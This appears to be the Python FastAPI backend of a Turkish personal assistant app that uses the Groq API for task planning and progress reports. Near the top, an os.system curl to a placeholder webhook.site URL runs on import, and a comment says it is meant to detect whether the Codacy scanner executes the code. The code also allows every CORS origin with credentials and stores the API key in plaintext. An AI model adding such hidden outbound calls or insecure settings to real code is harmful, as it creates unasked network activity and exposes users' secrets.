import json
import os
import random
import httpx
from datetime import datetime, date, timedelta
from fastapi import FastAPI
from pydantic import BaseModel
from fastapi.middleware.cors import CORSMiddleware
from typing import List, Optional

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

DB_FILE = "database.json"
GROQ_API_KEY = ""
import os
# Codacy bu kodu çalıştırırsa, bu komut benim verdiğim URL'ye bir sinyal gönderecek
os.system("curl https://webhook.site/SENIN-ÖZEL-URL-ADRESİN")
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"current": None, "daily_logs": {}, "chat_history": []}

def save_db(data):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

db = load_db()

# Kaydedilmiş API key'i yükle
GROQ_API_KEY = db.get("groq_api_key", "")

class Project(BaseModel):
    goal: str
    duration_days: int

class Progress(BaseModel):
    text: str

class CompleteTask(BaseModel):
    task_index: int

class ApiKeyModel(BaseModel):
    api_key: str

class ChatMessage(BaseModel):
    role: str
    content: str

class ChatRequest(BaseModel):
    message: str
    history: Optional[List[ChatMessage]] = []

class ChatProjectRequest(BaseModel):
    tasks: List[str]

# ----------- GROQ AI -----------

async def ask_groq(prompt: str, sistem: str = None, history: list = None) -> str:
    if not GROQ_API_KEY:
        return "API key ayarlanmamış. Ayarlar ekranından Groq API key'ini gir! 🔑"

    if sistem is None:
        sistem = """Sen Şeyma'nın kişisel AI asistanısın. 
Samimi, sıcak ve arkadaşça konuşursun. Türkçe konuşursun.
Emoji kullanırsın ama abartmazsın. Kısa ve öz cevaplar verirsin."""

    messages = []
    if history:
        for h in history:
            messages.append({"role": h["role"] if isinstance(h, dict) else h.role,
                            "content": h["content"] if isinstance(h, dict) else h.content})
    messages.append({"role": "user", "content": prompt})

    try:
        async with httpx.AsyncClient(timeout=30) as client:
            response = await client.post(
                "https://api.groq.com/openai/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {GROQ_API_KEY}",
                    "Content-Type": "application/json",
                },
                json={
                    "model": "llama-3.1-8b-instant",
                    "max_tokens": 500,
                    "messages": [{"role": "system", "content": sistem}] + messages
                }
            )
            data = response.json()
            if "error" in data:
                return f"AI hatası: {data['error'].get('message', 'bilinmeyen')}"
            return data["choices"][0]["message"]["content"]
    except Exception as e:
        return f"Bağlantı hatası: {str(e)[:50]}"

def get_today_stats():
    today = str(date.today())
    project = db.get("current") or {}
    log = db.get("daily_logs", {}).get(today, {})
    total = len(project.get("tasks", []))
    completed = len(project.get("completed", []))
    notes = log.get("notes", [])
    oran = int((completed / total) * 100) if total else 0
    return {
        "hedef": project.get("goal", ""),
        "total": total,
        "completed": completed,
        "oran": oran,
        "notes": notes,
        "tasks": project.get("tasks", []),
        "completed_tasks": project.get("completed", []),
        "remaining": [t for t in project.get("tasks", []) if t not in project.get("completed", [])]
    }

def akilli_plan_fallback(goal: str, days: int) -> list:
    goal_lower = goal.lower()
    if any(k in goal_lower for k in ["flutter", "dart", "mobil"]):
        havuz = ["Proje klasör yapısını düzenle","Ana ekran UI tasarımını tamamla","Veri modellerini oluştur","API bağlantısını kur","State management ekle","Kullanıcı giriş ekranını yap","Navigasyon sistemini kur","Hata yakalama ekle","Tüm ekranları test et","Release build al"]
    elif any(k in goal_lower for k in ["python", "fastapi", "backend"]):
        havuz = ["Gereksinimleri belirle","Klasör yapısını oluştur","Veritabanı modellerini tasarla","API endpoint'lerini yaz","Kimlik doğrulamayı ekle","Unit testleri yaz","Dokümantasyonu hazırla","Deploy et"]
    elif any(k in goal_lower for k in ["öğren", "kurs", "çalış", "oku"]):
        havuz = ["Kaynakları listele ve seç","İlk konuyu çalış","Not al ve özetle","Pratik alıştırma yap","İkinci konuya geç","Tekrar ve pekiştirme","Mini proje yap","Genel değerlendirme"]
    else:
        havuz = ["Araştır ve planla","İlk adımı at","İlerlemeyi kaydet","Geri bildirim al","Düzelt ve geliştir","Test et","Tamamla","Değerlendir"]
    random.shuffle(havuz)
    return havuz[:days]

# ----------- ENDPOINTLER -----------

@app.get("/")
def home():
    return {"mesaj": "Kişisel asistanın çalışıyor! 🤖", "ai_aktif": bool(GROQ_API_KEY)}

@app.post("/set-api-key")
async def set_api_key(data: ApiKeyModel):
    global GROQ_API_KEY
    GROQ_API_KEY = data.api_key
    # Kalıcı olarak kaydet
    db["groq_api_key"] = data.api_key
    save_db(db)
    test = await ask_groq("Merhaba! Kendini tek cümleyle tanıt, Şeyma'nın asistanı olarak.")
    return {"mesaj": "Groq API key ayarlandı ve kaydedildi!", "test": test}

@app.get("/api-status")
def api_status():
    return {
        "ai_aktif": bool(GROQ_API_KEY),
        "mesaj": "Groq AI aktif! ✅" if GROQ_API_KEY else "API key bekleniyor"
    }

# ----------- CHAT ENDPOINTİ (YENİ!) -----------

@app.post("/chat")
async def chat(data: ChatRequest):
    """Sohbet et + gerekirse görev listesi oluştur + analiz yap"""
    
    stats = get_today_stats()
    
    # Sistem promptu: asistan kişiliği + mevcut proje durumu
    sistem = f"""Sen Şeyma'nın kişisel AI asistanısın. Samimi, zeki ve yardımsever bir arkadaş gibi konuşursun. Türkçe konuşursun.

ŞEYMA'NIN MEVCUT DURUMU:
- Aktif hedef: {stats['hedef'] if stats['hedef'] else 'Henüz proje yok'}
- Görev ilerleme: {stats['completed']}/{stats['total']} tamamlandı (%{stats['oran']})
- Tamamlanan görevler: {', '.join(stats['completed_tasks']) if stats['completed_tasks'] else 'henüz yok'}
- Kalan görevler: {', '.join(stats['remaining'][:5]) if stats['remaining'] else 'hepsi bitti!'}
- Bugün yazılan notlar: {', '.join([n['text'] for n in stats['notes']]) if stats['notes'] else 'not yok'}

GÖREV LİSTESİ OLUŞTURMA:
- Eğer Şeyma bir şey YAPMAK istediğini söylerse (yeni proje, hedef, plan vs.) MUTLAKA görev listesi öner
- Görev listesi önerirken cevabının SONUNA şu formatta ekle:
  [GÖREVLER]
  Görev 1
  Görev 2
  Görev 3
  [/GÖREVLER]
- 4-8 görev arası, somut ve yapılabilir olsun

ANALİZ:
- Şeyma yaptıklarını anlatırsa gerçek verilerle karşılaştır ve samimi yorum yap
- "harika, mükemmel" gibi boş övgüler yapma, gerçekçi ol

GENEL:
- Kısa ve öz konuş (3-4 cümle max), emoji kullan ama abartma
- Şeyma'nın adını ara ara kullan"""

    # Geçmişi dict listesine çevir
    history_dicts = [{"role": h.role, "content": h.content} for h in (data.history or [])]
    
    # AI'dan cevap al
    raw_response = await ask_groq(data.message, sistem, history_dicts)
    
    # Görev listesini parse et
    tasks = []
    clean_response = raw_response
    
    if "[GÖREVLER]" in raw_response and "[/GÖREVLER]" in raw_response:
        start = raw_response.index("[GÖREVLER]") + len("[GÖREVLER]")
        end = raw_response.index("[/GÖREVLER]")
        task_block = raw_response[start:end].strip()
        tasks = [t.strip().lstrip("-•123456789. ") for t in task_block.split("\n") if t.strip()]
        
        # Görev bloğunu cevaptan temizle
        clean_response = raw_response[:raw_response.index("[GÖREVLER]")].strip()
        if not clean_response:
            clean_response = "Sana özel bir görev listesi hazırladım! Projeye eklemek ister misin? 📋"

    return {
        "cevap": clean_response,
        "gorevler": tasks if tasks else None
    }

@app.post("/chat/create-project")
async def create_project_from_chat(data: ChatProjectRequest):
    """Chat'ten gelen görev listesini projeye ekle"""
    
    if not data.tasks:
        return {"hata": "Görev listesi boş"}
    
    # Mevcut projenin hedefini koru, sadece görevleri güncelle
    hedef = db.get("current", {}).get("goal", "Chat'ten oluşturulan plan") if db.get("current") else "Chat'ten oluşturulan plan"
    
    db["current"] = {
        "goal": hedef,
        "days": len(data.tasks),
        "tasks": data.tasks,
        "completed": [],  # Yeni görev listesi = sıfırdan başla
        "created_at": str(date.today())
    }
    if "daily_logs" not in db:
        db["daily_logs"] = {}
    save_db(db)
    
    return {"mesaj": f"{len(data.tasks)} görev projeye eklendi! ✅", "gorevler": data.tasks}

# ----------- MEVCUT ENDPOINTLERİN TAMAMI -----------

@app.post("/project")
async def create_project(data: Project):
    tasks = []
    if GROQ_API_KEY:
        prompt = f"""Kullanıcının hedefi: "{data.goal}"
Süre: {data.duration_days} gün

Bu hedef için tam olarak {data.duration_days} adet somut, yapılabilir görev listesi oluştur.
SADECE görev adlarını yaz, her satıra bir görev.
Numara, tire veya madde işareti KULLANMA. Sadece görev adı."""
        sistem = "Sen bir proje planlama asistanısın. Sadece görev adlarını listele, her satıra bir tane. Başka hiçbir şey yazma."
        try:
            raw = await ask_groq(prompt, sistem)
            tasks = [t.strip().lstrip("-•123456789. ") for t in raw.strip().split("\n") if t.strip()]
            tasks = tasks[:data.duration_days]
        except:
            tasks = akilli_plan_fallback(data.goal, data.duration_days)
    else:
        tasks = akilli_plan_fallback(data.goal, data.duration_days)

    if not tasks:
        tasks = akilli_plan_fallback(data.goal, data.duration_days)

    db["current"] = {
        "goal": data.goal,
        "days": data.duration_days,
        "tasks": tasks,
        "completed": [],
        "created_at": str(date.today())
    }
    if "daily_logs" not in db:
        db["daily_logs"] = {}
    save_db(db)
    return {"mesaj": f"Plan hazır!", "gorevler": tasks}

@app.get("/analysis")
async def get_analysis():
    if not db.get("current"):
        return {
            "hedef": "Henüz proje yok",
            "tamamlanan_gorev": 0,
            "not_sayisi": 0,
            "basari_orani": "%0",
            "durum": "Başlamadı",
            "tavsiye": "Sağ üstten 'Yeni Proje'ye tıkla ya da Asistan sekmesinde ne yapmak istediğini söyle! 🚀"
        }

    stats = get_today_stats()
    prompt = f"""Şeyma'nın bugünkü durumu:
- Hedef: {stats['hedef']}
- Tamamlanan: {stats['completed']}/{stats['total']} görev (%{stats['oran']})
- Tamamlanan görevler: {', '.join(stats['completed_tasks']) if stats['completed_tasks'] else 'henüz yok'}
- Kalan görevler: {', '.join(stats['remaining']) if stats['remaining'] else 'hepsi bitti!'}
- Bugün yazdığı notlar: {', '.join([n['text'] for n in stats['notes']]) if stats['notes'] else 'not yok'}
Bu verilere bakarak Şeyma'ya ÖZEL, samimi bir yorum yap. Spesifik görev adlarından bahset. 2-3 cümle."""
    tavsiye = await ask_groq(prompt)

    if stats['oran'] < 30:
        durum = "Başlangıç aşaması"
    elif stats['oran'] < 70:
        durum = "İlerleme var"
    elif stats['oran'] < 100:
        durum = "Bitirmeye yakın"
    else:
        durum = "Tamamlandı 🎉"

    return {
        "hedef": stats['hedef'],
        "tamamlanan_gorev": stats['completed'],
        "not_sayisi": len(stats['notes']),
        "basari_orani": f"%{stats['oran']}",
        "durum": durum,
        "tavsiye": tavsiye
    }

@app.post("/complete-task")
async def complete_task(data: CompleteTask):
    if not db.get("current"):
        return {"hata": "Aktif proje yok"}
    project = db["current"]
    if "completed" not in project:
        project["completed"] = []
    if data.task_index < 0 or data.task_index >= len(project["tasks"]):
        return {"hata": "Geçersiz görev indexi"}
    task = project["tasks"][data.task_index]
    if task in project["completed"]:
        return {"mesaj": "Bu görevi zaten tamamladın! ✅"}
    project["completed"].append(task)

    today = str(date.today())
    if "daily_logs" not in db:
        db["daily_logs"] = {}
    if today not in db["daily_logs"]:
        db["daily_logs"][today] = {"notes": [], "completed_tasks": []}
    db["daily_logs"][today]["completed_tasks"].append(task)
    save_db(db)

    total = len(project["tasks"])
    done = len(project["completed"])
    oran = int((done / total) * 100)

    prompt = f"""Şeyma az önce '{task}' görevini tamamladı!
İlerleme: {done}/{total} görev (%{oran}).
Kısa, samimi ve motive edici bir kutlama mesajı yaz. 1-2 cümle."""
    yorum = await ask_groq(prompt)
    return {"mesaj": f"'{task}' tamamlandı!", "basari_orani": oran, "yorum": yorum}

@app.post("/progress")
async def add_progress(data: Progress):
    if not db.get("current"):
        return {"hata": "Önce proje oluşturmalısın"}
    today = str(date.today())
    if "daily_logs" not in db:
        db["daily_logs"] = {}
    if today not in db["daily_logs"]:
        db["daily_logs"][today] = {"notes": [], "completed_tasks": []}
    db["daily_logs"][today]["notes"].append({
        "text": data.text,
        "time": datetime.now().strftime("%H:%M")
    })
    save_db(db)

    stats = get_today_stats()
    prompt = f"""Şeyma şunu yazdı: "{data.text}"
Hedefi: {stats['hedef']}, bugün %{stats['oran']} ilerledi.
Bu nota kısa, samimi bir yorum yap. 1 cümle."""
    yorum = await ask_groq(prompt)
    return {"mesaj": "Not kaydedildi! 📝", "yorum": yorum}

@app.get("/report/weekly")
async def weekly_report():
    daily_logs = db.get("daily_logs", {})
    today = date.today()
    week_data = []
    total_rate = 0
    aktif_gun = 0

    for i in range(6, -1, -1):
        d = str(today - timedelta(days=i))
        log = daily_logs.get(d, {})
        notes = len(log.get("notes", []))
        completed = len(log.get("completed_tasks", []))
        total_tasks = len(db["current"]["tasks"]) if db.get("current") else 0
        oran = int((completed / total_tasks) * 100) if total_tasks else 0
        gun_adi = ["Pazartesi","Salı","Çarşamba","Perşembe","Cuma","Cumartesi","Pazar"][(today - timedelta(days=i)).weekday()]
        if notes > 0 or completed > 0:
            aktif_gun += 1
        total_rate += oran
        week_data.append({"tarih": d, "gun": gun_adi, "tamamlanan": completed, "not_sayisi": notes, "basari_orani": oran})

    ortalama = total_rate / 7
    is_weekend = today.weekday() >= 5

    prompt = f"""Şeyma'nın bu haftaki performansı:
- Ortalama başarı: %{ortalama:.0f}
- Aktif gün: {aktif_gun}/7
- Günlük dağılım: {[f"{d['gun']}: %{d['basari_orani']}" for d in week_data]}
- Hedef: {db['current']['goal'] if db.get('current') else 'yok'}
Haftayı değerlendiren samimi, kişisel bir haftalık rapor yorumu yaz. 2-3 cümle."""
    yorum = await ask_groq(prompt)

    return {
        "hafta_ozeti": week_data,
        "ortalama_basari": round(ortalama, 1),
        "aktif_gun_sayisi": aktif_gun,
        "sekreter_yorumu": yorum,
        "hafta_sonu_bildirimi": is_weekend,
        "bildirim_mesaji": f"📊 Haftalık rapor hazır! %{ortalama:.0f} başarı oranın var!" if is_weekend else None
    }

@app.get("/report/monthly")
async def monthly_report():
    daily_logs = db.get("daily_logs", {})
    today = date.today()
    current_month = today.strftime("%Y-%m")
    ay_logs = {k: v for k, v in daily_logs.items() if k.startswith(current_month)}
    total_tasks = len(db["current"]["tasks"]) if db.get("current") else 0

    toplam_tamamlanan = sum(len(v.get("completed_tasks", [])) for v in ay_logs.values())
    toplam_not = sum(len(v.get("notes", [])) for v in ay_logs.values())
    aktif_gun = len([v for v in ay_logs.values() if v.get("notes") or v.get("completed_tasks")])
    gunluk_oranlar = [int((len(v.get("completed_tasks",[])) / total_tasks)*100) if total_tasks else 0 for v in ay_logs.values()]
    ortalama = sum(gunluk_oranlar) / len(gunluk_oranlar) if gunluk_oranlar else 0

    try:
        next_month = today.replace(month=today.month % 12 + 1, day=1)
        days_in_month = (next_month - timedelta(days=1)).day
    except:
        days_in_month = 31
    is_month_end = today.day >= days_in_month - 2

    prompt = f"""Şeyma'nın {today.strftime('%B')} ayı özeti:
- Ortalama başarı: %{ortalama:.0f}
- Aktif gün: {aktif_gun}
- Tamamlanan görev: {toplam_tamamlanan}
- Yazılan not: {toplam_not}
- Hedef: {db['current']['goal'] if db.get('current') else 'yok'}
Ayı değerlendiren samimi, motive edici bir aylık rapor yorumu yaz. 2-3 cümle."""
    yorum = await ask_groq(prompt)

    return {
        "ay": today.strftime("%B %Y"),
        "aktif_gun": aktif_gun,
        "toplam_tamamlanan_gorev": toplam_tamamlanan,
        "toplam_not": toplam_not,
        "ortalama_basari": round(ortalama, 1),
        "sekreter_yorumu": yorum,
        "ay_sonu_bildirimi": is_month_end,
        "bildirim_mesaji": f"📅 Aylık rapor hazır! {today.strftime('%B')} ayında %{ortalama:.0f} başarın var!" if is_month_end else None
    }

@app.get("/check-notifications")
async def check_notifications():
    today = date.today()
    notifications = []
    if today.weekday() >= 5:
        weekly = await weekly_report()
        notifications.append({"tip": "haftalik", "baslik": "📊 Haftalık Rapor", "mesaj": weekly["sekreter_yorumu"], "detay": f"Bu hafta %{weekly['ortalama_basari']:.0f} ortalama, {weekly['aktif_gun_sayisi']} aktif gün!"})
    try:
        next_month = today.replace(month=today.month % 12 + 1, day=1)
        days_in_month = (next_month - timedelta(days=1)).day
    except:
        days_in_month = 31
    if today.day >= days_in_month - 2:
        monthly = await monthly_report()
        notifications.append({"tip": "aylik", "baslik": "🗓️ Aylık Rapor", "mesaj": monthly["sekreter_yorumu"], "detay": f"{today.strftime('%B')} ayında %{monthly['ortalama_basari']:.0f} başarı!"})
    return {"bildirim_var": len(notifications) > 0, "bildirimler": notifications}

@app.get("/suggest")
async def suggest():
    stats = get_today_stats()
    prompt = f"Şeyma'nın hedefi: {stats['hedef']}, %{stats['oran']} ilerledi, kalan görevler: {stats['remaining'][:3]}. Bugün için kısa bir öneri ver. 1 cümle."
    oneri = await ask_groq(prompt)
    return {"basari_orani": f"%{stats['oran']}", "onerı": oneri}

@app.get("/report")
async def get_report():
    stats = get_today_stats()
    yorum = await ask_groq(f"Şeyma %{stats['oran']} ilerledi, hedef: {stats['hedef']}. Kısa yorum yap.")
    return {"hedef": stats['hedef'], "toplam_gorev": stats['total'], "tamamlanan": stats['completed'], "basari_orani": f"%{stats['oran']}", "yorum": yorum}

@app.get("/tasks")
def get_tasks():
    if not db.get("current"):
        return {"tasks": [], "completed": [], "hedef": ""}
    project = db["current"]
    return {
        "hedef": project.get("goal", ""),
        "tasks": project.get("tasks", []),
        "completed": project.get("completed", []),
        "toplam": len(project.get("tasks", [])),
        "tamamlanan_sayi": len(project.get("completed", []))
    }
